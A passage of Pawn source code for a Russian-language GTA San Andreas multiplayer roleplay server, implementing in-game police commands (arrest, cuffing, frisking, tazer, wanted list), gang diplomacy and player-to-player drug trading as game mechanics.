	  		SendClientMessage(playerid,CREWARD,str2);
			TogglePlayerControllable(params[0], 1);
			SetPlayerVirtualWorld(params[0], 17);
		    SetPlayerWantedLevel(params[0],0);
		    SetPlayerInterior(params[0], 3);
		    PlayerInfo[params[0]][pWanted] = 0;
		    PlayerInfo[params[0]][pAr]++;
			DeletePVar(params[0],"Progulka");
		    static const fmt_string3[] = "Вы арестованы! До выхода на свободу: %d мин.";
			new str3[sizeof(fmt_string3)+5];
			format(str3, sizeof(str3), fmt_string3,PlayerInfo[params[0]][pJailTime]/60);
	  		SendClientMessage(params[0],CREWARD,str3);
	  		if(!PlayerInfo[playerid][pQuestS][16])
			{
				PlayerQuest[playerid][16][0]++;
				CheckQuest(playerid,16);
			}

		}
		else if(IsPlayerInRangeOfPoint(playerid, 20.0, 2297.1116,2451.5105,10.8203) && PlayerInfo[params[0]][pWanted] < 4)
		{
		    PlayerInfo[params[0]][pJail] = 4;
		    PlayerInfo[params[0]][pJailTime] = PlayerInfo[params[0]][pWanted]*60*6;
		    SetPVarInt(params[0],"Freeze",1);
		    Uncuff(params[0]);
			new rand = random(4);
			SetPlayerPos(params[0],KPZPos[rand][0],KPZPos[rand][1],KPZPos[rand][2]);
			SetPlayerFacingAngle(params[0],KPZPos[rand][3]);
            PlayerInfo[playerid][pPayDay] += 20*PlayerInfo[params[0]][pWanted];
            PlayerInfo[params[0]][pZakon] -= 5;
			static const fmt_string2[] = "Вы поймали преступника! К вашей зарплате прибавлено $%i";
			new str2[sizeof(fmt_string2)+5];
			format(str2, sizeof(str2), fmt_string2,20*PlayerInfo[params[0]][pWanted]);
	  		SendClientMessage(playerid,CREWARD,str2);
			TogglePlayerControllable(params[0], 1);
			SetPlayerVirtualWorld(params[0], 1);
			SetPlayerInterior(params[0], 3);
		    SetPlayerWantedLevel(params[0],0);
		    PlayerInfo[params[0]][pWanted] = 0;
		    PlayerInfo[params[0]][pAr]++;
			DeletePVar(params[0],"Progulka");
		    static const fmt_string3[] = "Вы арестованы! До выхода на свободу: %d мин.";
			new str3[sizeof(fmt_string3)+5];
			format(str3, sizeof(str3), fmt_string3,PlayerInfo[params[0]][pJailTime]/60);
	  		SendClientMessage(params[0],CREWARD,str3);
	  		if(!PlayerInfo[playerid][pQuestS][16])
			{
				PlayerQuest[playerid][16][0]++;
				CheckQuest(playerid,16);
			}

		}
		else
		{
		    SendClientMessage(playerid,CGREY,"Если у игрока до 4 розыска его требуется посадить в КПЗ участка");
			SendClientMessage(playerid,CGREY,"Если у игрока 4+ розыска его требуется посадить в тюрьму (/gps » Основное » Тюрьма)");
		}
		//SendClientMessage(playerid,CGREY,"Преступников с розыском меньше 5 сажают в КПЗ, если же розык больше или равен - в тюрьму!");
    }
    else SendClientMessage(playerid,CGREY,"Вам недоступна данная команда");
    return true;
}
CMD:ceject(playerid, params[])
{
    if(PlayerLogged[playerid] == false) return 1;
    if(IsACop(playerid))
    {
        if(PlayerInfo[playerid][pWork] == 0) return SendClientMessage(playerid,CGREY,"Начните рабочий день на базе организации");
        if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, CGREY, "Используйте: /ceject [id]");
		if(GetPlayerVehicleID(params[0]) == INVALID_VEHICLE_ID || GetPlayerVehicleID(playerid) == INVALID_VEHICLE_ID ||
        GetPlayerVehicleID(params[0]) != GetPlayerVehicleID(playerid)) return SendClientMessage(playerid, CGREY, "Вы не в одном транспорте");
        if(IsPlayerInRangeOfPoint(playerid, 20.0, 247.6362,1421.1980,10.5859))
		{
		    RemovePlayerFromVehicle(params[0]);
			SetPlayerPos(params[0],-0.2129 + random(5),-25.2112 + random(5),1999.5859);
			SetPlayerFacingAngle(params[0],342.2937);
			SetPlayerInterior(params[0],1);
			SetPlayerVirtualWorld(params[0], 1);
			Uncuff(params[0]);
		    SendClientMessage(playerid,-1,"Направляйтесь в тюрьму, чтобы посадить используйте: {f7ae11}/arrest");
		    SendClientMessage(params[0],CREWARD,"Ожидайте сотрудника!");
		}
		else
		{
			RemovePlayerFromVehicle(params[0]);
			TogglePlayerControllable(params[0], 0);
			SetTimerEx("Uncuff1",5000,false,"i",params[0]);
			SendClientMessage(playerid,-1,"Если вы на парковке участка то, чтобы посадить используйте: {f7ae11}/arrest");
			SendClientMessage(playerid,-1,"Игрок заморожен на 5 секунд!");
		    SendClientMessage(params[0],CREWARD,"Вы заморожены на 5 секунд!");
		}
		DeletePVar(params[0],"CopCar");
		DeletePVar(params[0],"Jail");
		static const fmt_string[] = "%s взял %s и выталкал из транспорта";
		new str[sizeof(fmt_string)+MAX_PLAYER_NAME+MAX_PLAYER_NAME];
		format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername],PlayerInfo[params[0]][pSendername]);
		ProxDetectorNew(playerid,30.0,COLOR_PURPLE,str);
		SetPlayerChatBubble(playerid, "выталкал из транспорта", COLOR_PURPLE, 30.0, 7000);
    }
    else SendClientMessage(playerid,CGREY,"Вам недоступна данная команда");
    return true;
}


CMD:diplo(playerid, params[])
{
    if(PlayerLogged[playerid] == false) return 1;
	if(IsAMafia(playerid) || IsAGang(playerid))
	{
	    new str[50],strg[50*8];
	    new kek = 0;
		for(new i = 0; i <= 8; i++)
		{
		    if(i == PlayerInfo[playerid][pMember]-6) continue;
		    format(str,sizeof(str),"%s\t%s\n",FracInfo[i+6][fName],DiploCheck[DiploInfo[PlayerInfo[playerid][pMember]-6][i]]);
		    strcat(strg,str);
		    ListNick[playerid][kek] = i;
			kek++;
		    
		}
	    if(!PlayerInfo[playerid][pLeader]) ShowPlayerDialog(playerid,0,DIALOG_STYLE_LIST,"Дипломатия",strg,"Закрыть","");
	    else ShowPlayerDialog(playerid,348,DIALOG_STYLE_TABLIST,"Дипломатия",strg,"Изменить","Закрыть");
	}
	return 1;
}

CMD:selldrugs(playerid, params[])
{
    if(PlayerLogged[playerid] == false) return 1;
	if(IsAMafia(playerid) || IsAGang(playerid))
	{
	    if(sscanf(params, "uii", params[0],params[1],params[2])) return SendClientMessage(playerid, CGREY, "Используйте: /selldrugs [id] [кол-во] [цена]");
	    if(PlayerInfo[params[0]][pCash] < params[2]) return SendClientMessage(playerid,CGREY,"Недостаточно средств");
		if(PlayerInfo[playerid][pDrugs] < params[1]) return SendClientMessage(playerid,CGREY,"У Вас нет данного кол-ва наркотиков");
		if(params[2] < 1 || params[2] > 1000000) return SendClientMessage(playerid,CGREY,"Вы не можете продать наркотики меньше чем за $1 и больше чем за $1000000");
		if(params[1] < 1) return SendClientMessage(playerid,CGREY,"Вы не можете продать меньше 1 наркотика");
 		new Float:x,Float:y,Float:z;
 		GetPlayerPos(params[0],x,y,z);
   		if(!IsPlayerInRangeOfPoint(playerid, 5.0, x,y,z) || params[0] == playerid) return SendClientMessage(playerid,CGREY,"Вы не рядом с игроком");
   		//if(PlayerInfo[params[0]][pLevel] < 2) return SendClientMessage(playerid, CGREY, "Вы не можете продать это игоку с 1 уровнем");
		if(GetPred(params[0]) == 1) return SendClientMessage(playerid,CGREY,"Игроку уже кто-то что-то предложил");
		SendClientMessage(playerid,CREWARD,"Вы предложили игроку купить наркотики");
		static const fmt_string1[] = "%s предложил Вам купить %i наркотиков. Цена: $%i";
		new str1[sizeof(fmt_string1)+MAX_PLAYER_NAME+5];
		format(str1, sizeof(str1), fmt_string1,PlayerInfo[playerid][pSendername],params[1],params[2]);
		SendClientMessage(params[0],0xFF7F50FF,str1);
		SendClientMessage(params[0],CWHITE,"Для согласия нажмите{FF7F50} [Y]{FFFFFF} ,для отказа нажмите {FF7F50}[N]");
		SetPVarInt(params[0],"SellDrugsID2",playerid);
		SetPVarInt(params[0],"SellDrugsCena2",params[2]);
		SetPVarInt(params[0],"SellDrugs2",params[1]);

	}
	else SendClientMessage(playerid,CGREY,"Вам недоступна данная команда");
	return true;
}
stock GetFreeSeat(vehicleid)
{
    if(!vehicleid) return -1;
    new model = GetVehicleModel(vehicleid);
    new maxs = GetMaxSeat(model) - 1;
    new bool:seat[3],cnt;
    for(new i;i<MAX_PLAYERS;i++)
    {
        if(!IsPlayerConnected(i) || GetPlayerVehicleID(i) != vehicleid) continue;
        new pseat = GetPlayerVehicleSeat(i);
        if(pseat < 1 || pseat > 3) continue;
        seat[pseat-1] = true;
        cnt++;
        if(cnt >= maxs) return -1;
    }
    for(new i;i<3;i++) if(!seat[i]) return i+1;
    return -1;
}
stock GetMaxSeat(modelid)
{
    switch(modelid)
    {
        case 596..598,427,490: return 4;
        case 599,497,528: return 2;
    }
    return -1;
}
CMD:cput(playerid, params[])
{
    if(PlayerLogged[playerid] == false) return 1;
    if(IsACop(playerid))
    {
        if(PlayerInfo[playerid][pWork] == 0) return SendClientMessage(playerid,CGREY,"Начните рабочий день на базе организации");
        if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, CGREY, "Используйте: /cput [id]");
        new Float:x,Float:y,Float:z;
	    GetPlayerPos(params[0],x,y,z);
	    if(!IsPlayerInRangeOfPoint(playerid, 8.0, x,y,z)) return SendClientMessage(playerid,CGREY,"Вы не рядом с игроком");
		if(GetVehicleModel(GetPlayerVehicleID(playerid)) != 599 && GetVehicleModel(GetPlayerVehicleID(playerid)) != 598 && GetVehicleModel(GetPlayerVehicleID(playerid)) != 409) return SendClientMessage(playerid,CGREY,"Вы не в машине для патрулирования");
		if(GetPlayerSpecialAction(params[0]) != SPECIAL_ACTION_CUFFED) return SendClientMessage(playerid,CGREY,"Затолкать можно только игрока в наручниках");
		new kek = GetFreeSeat(GetPlayerVehicleID(playerid));
		
		if(kek == -1) return SendClientMessage(playerid,CGREY,"В транспорте нет мест");
		SetPVarInt(params[0],"CopCar",1);
		SetPVarInt(params[0],"Jail",1);
		TogglePlayerControllable(params[0], 0);
		PutPlayerInVehicle(params[0], GetPlayerVehicleID(playerid), kek);
		SendClientMessage(playerid,-1,"Чтобы посадить игрока около входа в тюрьму/на парковке, используйте {f7ae11}/ceject");
		static const fmt_string[] = "%s взял %s и затолкал в машину";
		new str[sizeof(fmt_string)+MAX_PLAYER_NAME+MAX_PLAYER_NAME];
		format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername],PlayerInfo[params[0]][pSendername]);
		ProxDetectorNew(playerid,30.0,COLOR_PURPLE,str);
		SetPlayerChatBubble(playerid, "затолкал в машину", COLOR_PURPLE, 30.0, 7000);
    }
    else SendClientMessage(playerid,CGREY,"Вам недоступна данная команда");
    return true;
}
CMD:find(playerid, params[])
{
    if(PlayerLogged[playerid] == false) return 1;
    if(IsACop(playerid))
    {
        if(PlayerInfo[playerid][pWork] == 0) return SendClientMessage(playerid,CGREY,"Начните рабочий день на базе организации");
        if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, CGREY, "Используйте: /find [id]");
        if(PlayerInfo[params[0]][pPhone] == 0 || GetPVarFloat(params[0],"PhoneX") == 0) return SendClientMessage(playerid,CGREY,"Не удается соединисться со спутником");
        SetPlayerRaceCheckpoint(playerid,2,GetPVarFloat(params[0],"PhoneX"),GetPVarFloat(params[0],"PhoneY"),GetPVarFloat(params[0],"PhoneZ"),0,0,0,10);
        SendClientMessage(playerid,CREWARD,"На карте показано место последнего использования сим-карты игрока");
    	SetPVarInt(playerid,"GPS",1);
    }
    else SendClientMessage(playerid,CGREY,"Вам недоступна данная команда");
    return true;
}
CMD:pcarpass(playerid, params[])
{
    if(PlayerLogged[playerid] == false) return 1;
    if(IsACop(playerid))
    {
        if(PlayerInfo[playerid][pWork] == 0) return SendClientMessage(playerid,CGREY,"Начните рабочий день на базе организации");
        new kek;
		for(new v = 1; v <= TOTALVEH; v++)
		{
		    if(GetPlayerVehicleID(playerid) != VehInfo[v][vVehicle]) continue;
			if(VehInfo[v][vFr] != PlayerInfo[playerid][pMember]) continue;
			kek = v;
			break;
		}
		if(!kek) return SendClientMessage(playerid,CGREY,"Использовать можно только в транспорте организации");
		if(sscanf(params, "s[20]", params)) return SendClientMessage(playerid, CGREY, "Используйте: /pcarpass [номер]");
		kek = -1;
		for(new v = 1; v <= TOTALV; v++)
		{
		    if(VInfo[v][vcar] == INVALID_VEHICLE_ID) continue;
			if(!strcmp(VInfo[v][vnumber],params,true) && strcmp(VInfo[v][vname],"None",true))
			{
				kek = v;
				break;
			}
		}
		if(kek == -1) return SendClientMessage(playerid,CGREY,"Транспорта с таким номером не существует");
		static const fmt_string[] = "{FFFFFF}Марка автомобиля: {f7ae11}%s{FFFFFF}\nВладелец: {f7ae11}%s{FFFFFF}\nПоследний водитель: {f7ae11}%s";
		new str[sizeof(fmt_string)+MAX_PLAYER_NAME+MAX_PLAYER_NAME+32];
		format(str, sizeof(str), fmt_string,VehicleNameS[VInfo[kek][vmodel]-400],VInfo[kek][vname],LastDriver[VInfo[kek][vcar]]);
  		ShowPlayerDialog(playerid, 0, DIALOG_STYLE_TABLIST_HEADERS, "Информация о транспорте",str,"Далее","");
	//	ShowPlayerDialog(playerid,0,DIALOG_STYLE_MSGBOX,"Розыск",srrt,"Далее","");
    }
    else SendClientMessage(playerid,CGREY,"Вам недоступна данная команда");
    return true;
}
CMD:wanted(playerid, params[])
{
    if(PlayerLogged[playerid] == false) return 1;
    if(IsACop(playerid))
    {
        if(PlayerInfo[playerid][pWork] == 0) return SendClientMessage(playerid,CGREY,"Начните рабочий день на базе организации");
        new kek;
		for(new v = 1; v <= TOTALVEH; v++)
		{
		    if(GetPlayerVehicleID(playerid) != VehInfo[v][vVehicle]) continue;
			if(VehInfo[v][vFr] != PlayerInfo[playerid][pMember]) continue;
			kek = v;
			break;
		}
		if(!kek) return SendClientMessage(playerid,CGREY,"Использовать можно только в транспорте организации");
        new ras[15];
        query = "";
        strcat(query, "Имя\tУровень розыка\tПричина\tРасстояние{FFFFFF}");
        new lel = 0;
        new Float:x,Float:y,Float:z;
        static const fmt_string[] = "%s\t%i\t%s\t\n";
		new str[sizeof(fmt_string)+MAX_PLAYER_NAME+3];
		for(new i = 0; i < MAX_PLAYERS; i++)
		{
		    if(!IsPlayerConnected(i) || PlayerLogged[i] == false) continue;
		    if(!PlayerInfo[i][pWanted]) continue;
	        GetPlayerPos(i,x,y,z);
	        format(ras,sizeof(ras),"%.1f м.",GetPlayerDistanceFromPoint(playerid, x,y,z));
   			
			format(str, sizeof(str), fmt_string,PlayerInfo[i][pSendername],PlayerInfo[i][pWanted],PlayerInfo[i][pSuAd],(GetPlayerVirtualWorld(i)) ? ("Недоступно") : (ras));
			strcat(query, str);
			lel++;
		}
		if(lel == 0) return SendClientMessage(playerid,CGREY,"Список пуст");
  		ShowPlayerDialog(playerid, 0, DIALOG_STYLE_TABLIST_HEADERS, "Розыск",query,"Далее","");
	//	ShowPlayerDialog(playerid,0,DIALOG_STYLE_MSGBOX,"Розыск",srrt,"Далее","");
    }
    else SendClientMessage(playerid,CGREY,"Вам недоступна данная команда");
    return true;
}
CMD:free(playerid, params[])
{
    if(PlayerLogged[playerid] == false) return 1;
    if(PlayerInfo[playerid][pMember] == F_MAYOR)
    {
        if(PlayerInfo[playerid][pWork] == 0) return SendClientMessage(playerid,CGREY,"Начните рабочий день на базе организации");
		new text[20];
        if(sscanf(params, "us[20]", params[0],text)) return SendClientMessage(playerid, CGREY, "Используйте: /free [id] [статья]");
        if(PlayerInfo[playerid][pRank] < 4) return SendClientMessage(playerid,CGREY,"Вам недоступна данная команда");
        new Float:x,Float:y,Float:z;
	    GetPlayerPos(params[0],x,y,z);
	    if(!IsPlayerInRangeOfPoint(playerid, 8.0, x,y,z)) return SendClientMessage(playerid,CGREY,"Вы не рядом с игроком");
	    if(PlayerInfo[params[0]][pJail] == 0) return SendClientMessage(playerid,CGREY,"Игрок не в тюрьме");
		if(GetPred(params[0]) == 1) return SendClientMessage(playerid,CGREY,"Игроку уже кто-то что-то предложил");
		if(PlayerInfo[params[0]][pWantedA] == 6) return SendClientMessage(playerid,CGREY,"Нельзя выпускать игроков, у которых было 6 уровень розыска");
		SendClientMessage(playerid,CREWARD,"Вы предложили игроку выйти из тюрьмы");
	   	static const fmt_string1[] = "%s предложил Вам выйти из тюрьмы. Цена: $%i";
		new str1[sizeof(fmt_string1)+MAX_PLAYER_NAME+50];
		format(str1, sizeof(str1), fmt_string1,PlayerInfo[playerid][pSendername],PlayerInfo[params[0]][pJailTime]/60*100);
		SendClientMessage(params[0],0xFF7F50FF,str1);
		SendClientMessage(params[0],CWHITE,"Для согласия нажмите{FF7F50} [Y]{FFFFFF} ,для отказа нажмите {FF7F50}[N]");
		SetPVarInt(params[0],"Adv",1);
		SetPVarInt(params[0],"AdvID",playerid);
		SetPVarInt(params[0],"AdvCena",PlayerInfo[params[0]][pJailTime]/60*100);
		SetPVarString(params[0],"AdvStat",text);
    }
    else SendClientMessage(playerid,CGREY,"Вам недоступна данная команда");
    return true;
}
CMD:tazer(playerid, params[])
{
    if(PlayerLogged[playerid] == false) return 1;
    if(IsACop(playerid))
    {
        if(PlayerInfo[playerid][pWork] == 0) return SendClientMessage(playerid,CGREY,"Начните рабочий день на базе организации");
        if(GetPVarInt(playerid,"Tazer") == 0)
        {
			if(GetPlayerWeapon(playerid) != 23)
			{
	            SetPlayerArmedWeapon(playerid,0);
	            SetPlayerAttachedObject(playerid, 1, 18642, 6, 0.0795, 0.015, 0.0295, 180.0, 0.0, 0.0);
	            SendClientMessage(playerid,-1,"Для того, чтобы использовать электрошокер наведите на игрока (ПКМ) и ударьте его (ЛКМ)");
			}
			else SendClientMessage(playerid,-1,"Для того, чтобы использовать электрошокер выстрелите в игрока из Silenced Pistol");
            SetPVarInt(playerid,"Tazer",1);
            static const fmt_string[] = "%s достал электрошокер";
			new str[sizeof(fmt_string)+MAX_PLAYER_NAME];
			format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername]);
			ProxDetectorNew(playerid,30.0,COLOR_PURPLE,str);
			SetPlayerChatBubble(playerid, "достал электрошокер", COLOR_PURPLE, 30.0, 7000);
            SendClientMessage(playerid,CREWARD,"Вы достали шокер");
        }
        else
        {
            if(IsPlayerAttachedObjectSlotUsed(playerid, 1)) RemovePlayerAttachedObject(playerid, 1);
            DeletePVar(playerid,"Tazer");
            static const fmt_string[] = "%s убрал электрошокер";
			new str[sizeof(fmt_string)+MAX_PLAYER_NAME];
			format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername]);
			ProxDetectorNew(playerid,30.0,COLOR_PURPLE,str);
			SetPlayerChatBubble(playerid, "убрал электрошокер", COLOR_PURPLE, 30.0, 7000);
            SendClientMessage(playerid,CREWARD,"Вы убрали шокер");
        }
    }
    else SendClientMessage(playerid,CGREY,"Вам недоступна данная команда");
    return true;
}
// ======================= ATTACH
forward gc_UpdateSuspect(suspectid);
public gc_UpdateSuspect(suspectid)
{
	if(GetPVarInt(suspectid,"Cops"))
	{
		new
			Float: x,
			Float: y,
			Float: z,
			Float: distance;
		new playerid = GetPVarInt(suspectid,"CopsID");
		GetPlayerPos(playerid, x, y, z);
		distance =
			gc_GetDistanceBetweenPlayers(playerid, suspectid);

		if(distance > gc_SUSPECT_RANGE_TP)
		{
			new Float: a;
			GetPlayerFacingAngle(playerid, a);

			x += ((gc_SUSPECT_RANGE_RUN - 1.0 > 0.0) ?
				(gc_SUSPECT_RANGE_RUN - 1.0) : (1.0)) * floatsin(-a, degrees);
			y += ((gc_SUSPECT_RANGE_RUN - 1.0 > 0.0) ?
				(gc_SUSPECT_RANGE_RUN - 1.0) : (1.0)) * floatcos(-a, degrees);
			SetPVarInt(suspectid,"Cops",2);

			SetPlayerPos(suspectid, x, y, z);
			goto gc_reset_suspect_updating;
		}

		else if(distance > gc_SUSPECT_RANGE_RUN)
		{
			if(GetPVarInt(suspectid,"Cops") == 2)
			{
				TogglePlayerControllable(suspectid, 1);
				ApplyAnimation(suspectid, "ped", "run_civi",
					4.1, 1, 1, 1, 0, 0, 1);

				SetPVarInt(suspectid,"Cops",1);
			}
		}

		else if(distance < gc_SUSPECT_RANGE_RUN && GetPVarInt(suspectid,"Cops") == 1)
		{
			TogglePlayerControllable(suspectid, 0);
			SetPVarInt(suspectid,"Cops",2);
		}

		gc_reset_suspect_updating:
		gc_SetSuspectLook(suspectid, x, y);
		SetTimerEx("gc_UpdateSuspect", gc_SUSPECT_UPDATE_INTERVAL, 0,
			"i", suspectid);
	}
	return 1;
}

CMD:attach(playerid, params[])
{
    if(PlayerLogged[playerid] == false) return 1;
    if(IsACop(playerid))
    {
        if(PlayerInfo[playerid][pWork] == 0) return SendClientMessage(playerid,CGREY,"Начните рабочий день на базе организации");
        if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, CGREY, "Используйте: /attach [id]");
        new Float:x,Float:y,Float:z;
	    GetPlayerPos(params[0],x,y,z);
	    if(!IsPlayerInRangeOfPoint(playerid, 5.0, x,y,z)) return SendClientMessage(playerid,CGREY,"Вы не рядом с игроком");
		if(GetPlayerSpecialAction(params[0]) != SPECIAL_ACTION_CUFFED) return SendClientMessage(playerid,CGREY,"Игрок не в наручниках");
	    TogglePlayerControllable(params[0], 0);
		SetPVarInt(params[0],"Cops",1);
		SetPVarInt(params[0],"AntiSbiv",1);
		SetPVarInt(params[0],"CopsID",playerid);
		SetPVarInt(playerid,"AttachPlayer",params[0]+1);
		static const fmt_string[] = "%s тянет игрока %s";
		new str[sizeof(fmt_string)+MAX_PLAYER_NAME+32];
		format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername],PlayerInfo[params[0]][pSendername]);
		ProxDetectorNew(playerid,30.0,COLOR_PURPLE,str);
		SetPlayerChatBubble(playerid, "тянет игрока", COLOR_PURPLE, 30.0, 7000);
		SendClientMessage(playerid,CREWARD,"Чтобы отпустить игрока используйте: /unattach");
		gc_UpdateSuspect(params[0]);
    }
    else SendClientMessage(playerid,CGREY,"Вам недоступна данная команда");
    return true;
}
CMD:unattach(playerid, params[])
{
    if(PlayerLogged[playerid] == false) return 1;
    if(IsACop(playerid))
    {
        if(PlayerInfo[playerid][pWork] == 0) return SendClientMessage(playerid,CGREY,"Начните рабочий день на базе организации");
        if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, CGREY, "Используйте: /unattach [id]");
        new Float:x,Float:y,Float:z;
	    GetPlayerPos(params[0],x,y,z);
	    if(!IsPlayerInRangeOfPoint(playerid, 5.0, x,y,z)) return SendClientMessage(playerid,CGREY,"Вы не рядом с игроком");
		if(GetPVarInt(params[0],"Cops") == 0 || params[0] != GetPVarInt(playerid,"AttachPlayer")-1) return SendClientMessage(playerid,CGREY,"Вы не тянули игрока");
	    TogglePlayerControllable(params[0], 1);
		DeletePVar(params[0],"Cops");
		DeletePVar(params[0],"CopsID");
		DeletePVar(params[0],"AntiSbiv");
		
		DeletePVar(playerid,"AttachPlayer");
		static const fmt_string[] = "%s отпустил игрока %s";
		new str[sizeof(fmt_string)+MAX_PLAYER_NAME+32];
		format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername],PlayerInfo[params[0]][pSendername]);
		ProxDetectorNew(playerid,30.0,COLOR_PURPLE,str);
		SetPlayerChatBubble(playerid, "отпустил игрока", COLOR_PURPLE, 30.0, 7000);
    }
    else SendClientMessage(playerid,CGREY,"Вам недоступна данная команда");
    return true;
}

// =========================

CMD:uncuff(playerid, params[])
{
    if(PlayerLogged[playerid] == false) return 1;
    if(IsACop(playerid))
    {
        if(PlayerInfo[playerid][pWork] == 0) return SendClientMessage(playerid,CGREY,"Начните рабочий день на базе организации");
        if(sscanf(params, "u", params[0]) || !GetPVarInt(params[0],"TimeCuff")) return SendClientMessage(playerid, CGREY, "Используйте: /uncuff [id]");
        new Float:x,Float:y,Float:z;
	    GetPlayerPos(params[0],x,y,z);
	    if(!IsPlayerInRangeOfPoint(playerid, 5.0, x,y,z)) return SendClientMessage(playerid,CGREY,"Вы не рядом с игроком");
     	KillTimer(GetPVarInt(params[0],"TimeCuff"));
     	static const fmt_string[] = "%s снял наручники с %s";
		new str[sizeof(fmt_string)+MAX_PLAYER_NAME+32];
		format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername],PlayerInfo[params[0]][pSendername]);
		ProxDetectorNew(playerid,30.0,COLOR_PURPLE,str);
		SetPlayerChatBubble(playerid, "снял наручники", COLOR_PURPLE, 30.0, 7000);
	    Uncuff(params[0]);
	    if(GetPVarInt(params[0],"Cops") != 0 || params[0] == GetPVarInt(playerid,"AttachPlayer")-1) 
	    {
			TogglePlayerControllable(params[0], 1);
			DeletePVar(params[0],"Cops");
			DeletePVar(params[0],"CopsID");
			DeletePVar(params[0],"AntiSbiv");
			DeletePVar(playerid,"AttachPlayer");
	    }
    }
    else SendClientMessage(playerid,CGREY,"Вам недоступна данная команда");
    return true;
}
CMD:fmenu(playerid, params[])
{
	if(PlayerInfo[playerid][pMember] != F_FBI && PlayerInfo[playerid][pRank] < 8) return SendClientMessage(playerid,CGREY,"Вам недоступна данная команда");
    if(PlayerInfo[playerid][pWork] == 0) return SendClientMessage(playerid,CGREY,"Начните рабочий день на базе организации");
    ShowPlayerDialog(playerid,448,DIALOG_STYLE_LIST,"Меню канала","1 | Открыть/закрыть канал\n2 | Список участников\n3 | Пригласить в канал\n4 | Удалить из канала","Далее","Отмена");
    return 1;
}

CMD:cuff(playerid, params[])
{
    if(PlayerLogged[playerid] == false) return 1;
    if(IsACop(playerid))
    {
        if(PlayerInfo[playerid][pWork] == 0) return SendClientMessage(playerid,CGREY,"Начните рабочий день на базе организации");
        if(sscanf(params, "u", params[0]) || GetPVarInt(params[0],"TimeCuff") || PlayerInfo[params[0]][pJailTime]) return SendClientMessage(playerid, CGREY, "Используйте: /cuff [id]");
        new Float:x,Float:y,Float:z;
	    GetPlayerPos(params[0],x,y,z);
	    if(!IsPlayerInRangeOfPoint(playerid, 5.0, x,y,z)) return SendClientMessage(playerid,CGREY,"Вы не рядом с игроком");
	    if(PlayerInfo[params[0]][pWanted] == 0) return SendClientMessage(playerid,CGREY,"Игрок не в розыске");
	    ClearAnim(params[0]);
     	SetPlayerSpecialAction(params[0],0);
	    SetPlayerAttachedObject(params[0], 2, 19418, 6, -0.011000, 0.028000, -0.022000, -15.600012, -33.699977, -81.700035, 0.891999, 1.000000, 1.168000);
     	SetPlayerSpecialAction(params[0],SPECIAL_ACTION_CUFFED);
		static const fmt_string[] = "%s надел наручники на %s";
		new str[sizeof(fmt_string)+MAX_PLAYER_NAME+32];
		format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername],PlayerInfo[params[0]][pSendername]);
		ProxDetectorNew(playerid,30.0,COLOR_PURPLE,str);
		SetPlayerChatBubble(playerid, "надел наручники", COLOR_PURPLE, 30.0, 7000);
		new time = SetTimerEx("Uncuff",300000,false,"i",params[0]);
		SetPVarInt(params[0],"TimeCuff",time);
    }
    else SendClientMessage(playerid,CGREY,"Вам недоступна данная команда");
    return true;
}
CMD:frisk(playerid, params[])
{
    if(PlayerLogged[playerid] == false) return 1;
    if(IsACop(playerid))
    {
        if(PlayerInfo[playerid][pWork] == 0) return SendClientMessage(playerid,CGREY,"Начните рабочий день на базе организации");
        if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, CGREY, "Используйте: /frisk [id]");
        new Float:x,Float:y,Float:z;
	    GetPlayerPos(params[0],x,y,z);
	    if(!IsPlayerInRangeOfPoint(playerid, 5.0, x,y,z)) return SendClientMessage(playerid,CGREY,"Вы не рядом с игроком");
	    Inven(playerid,params[0]);
		static const fmt_string[] = "%s обыскал %s";
		new str[sizeof(fmt_string)+MAX_PLAYER_NAME+64];
		format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername],PlayerInfo[params[0]][pSendername]);
		ProxDetectorNew(playerid,30.0,COLOR_PURPLE,str);
		SetPlayerChatBubble(playerid, "обыскал", COLOR_PURPLE, 30.0, 7000);
    }
    else SendClientMessage(playerid,CGREY,"Вам недоступна данная команда");
    return true;
}
CMD:obj(playerid)
{
    print("команда");
    if(PlayerLogged[playerid] == false || GetPlayerVirtualWorld(playerid) > 0 || GetPlayerInterior(playerid) > 0 || GetPVarInt(playerid,"Object")) return 1;
    if(IsACop(playerid))
    {
        if(PlayerInfo[playerid][pWork] == 0) return SendClientMessage(playerid,CGREY,"Начните рабочий день на базе организации");
		new srrt[400],str[50],str1[5];
		for(new i = 0; i <= 4; i++)
		{
		    format(str1,sizeof(str1),"obj%i",i);
		    if(PlayerInfo[playerid][pObject][i] > 0)
		    {
				format(str,sizeof(str),"Объект №%i - Удалить\n",PlayerInfo[playerid][pObject][i]);
				strcat(srrt, str);
				SetPVarInt(playerid,str1,1);
			}
			else
			{
			    DeletePVar(playerid,str1);
				strcat(srrt, "Поставить объект\n");
			}
			ListNick[playerid][i] = i;
		}
		ShowPlayerDialog(playerid,237,DIALOG_STYLE_LIST,"Объекты",srrt,"Далее","Отмена");
    }
    else SendClientMessage(playerid,CGREY,"Вам недоступна данная команда");
    return true;
}
/*CMD:camoff(playerid)
{
	if(!GetPVarInt(playerid,"Camera") || PlayerLogged[playerid] == false) return true;
	SetPlayerPos(playerid,2350.3020,-1358.7502,735.0300);
	SetPlayerInterior(playerid,1);
	SetPlayerVirtualWorld(playerid,1);
	return SetCameraBehindPlayer(playerid);
}*/
CMD:clear(playerid, params[])
{
    if(PlayerLogged[playerid] == false) return 1;
    if(IsACop(playerid))
    {
        SendClientMessage(playerid,CGREY,"Используйте компьютер в участке");
    }
    else SendClientMessage(playerid,CGREY,"Вам недоступна данная команда");
    return true;
}
CMD:enter(playerid)
{
    if(PlayerLogged[playerid] == false) return 1;
    if(PlayerInfo[playerid][pMember] != F_FBI) return SendClientMessage(playerid,CGREY,"Вам недоступна данная команда");
	new Float:CarPos[3];
    GetCoordBootVehicle(fbidal,CarPos[0],CarPos[1],CarPos[2]);
